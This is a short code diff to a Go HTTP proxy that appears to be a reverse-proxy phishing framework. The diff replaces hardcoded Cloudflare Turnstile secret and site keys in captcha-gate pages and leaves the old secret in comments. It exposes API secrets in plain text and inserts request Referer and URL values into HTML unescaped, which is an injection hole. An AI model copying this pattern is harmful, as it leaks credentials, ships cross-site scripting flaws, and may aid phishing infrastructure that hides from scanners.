@@ -186,7 +186,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							client := &http.Client{Timeout: 10 * time.Second}
 							
 							verification_data := url.Values{}
-							verification_data.Set("secret", "0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q")
+							verification_data.Set("secret", "0x4AAAAAABmbtALyLDiz-nJcVTWWyha363k") //0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q
 							verification_data.Set("response", token)
 							verification_data.Set("remoteip", strings.SplitN(req.RemoteAddr, ":", 2)[0])
 							
@@ -266,7 +266,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         <form id="captcha-form" action="/verify_captcha" method="POST">
             <input type="hidden" name="redirect_path" value="` + req.Referer() + `">
             <div class="captcha-container">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABmbtBvgr27YFOfs" data-theme="light" data-callback="onCaptchaSuccess"></div>
             </div>
         </form>
     </div>
@@ -321,7 +321,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         <form id="captcha-form" action="/verify_captcha" method="POST">
             <input type="hidden" name="redirect_path" value="/">
             <div class="captcha-container">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABmbtBvgr27YFOfs" data-theme="light" data-callback="onCaptchaSuccess"></div>
             </div>
         </form>
     </div>
@@ -1707,7 +1707,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 				client := &http.Client{Timeout: 10 * time.Second}
 				
 				verification_data := url.Values{}
-				verification_data.Set("secret", "0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q")
+				verification_data.Set("secret", "0x4AAAAAABmbtALyLDiz-nJcVTWWyha363k")//0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q
 				verification_data.Set("response", token)
 				verification_data.Set("remoteip", strings.SplitN(req.RemoteAddr, ":", 2)[0])
 				
@@ -1818,7 +1818,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         <form id="captcha-form" action="/verify_captcha" method="POST">
             <input type="hidden" name="redirect_path" value="` + req.Referer() + `">
             <div class="captcha-container">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABmbtBvgr27YFOfs" data-theme="light" data-callback="onCaptchaSuccess"></div>
             </div>
         </form>
     </div>
@@ -1902,7 +1902,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         <form id="captcha-form" action="/verify_captcha" method="POST">
             <input type="hidden" name="redirect_path" value="` + req.URL.String() + `">
             <div class="captcha-container">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAABmbtBvgr27YFOfs" data-theme="light" data-callback="onCaptchaSuccess"></div>
             </div>
         </form>
     </div>
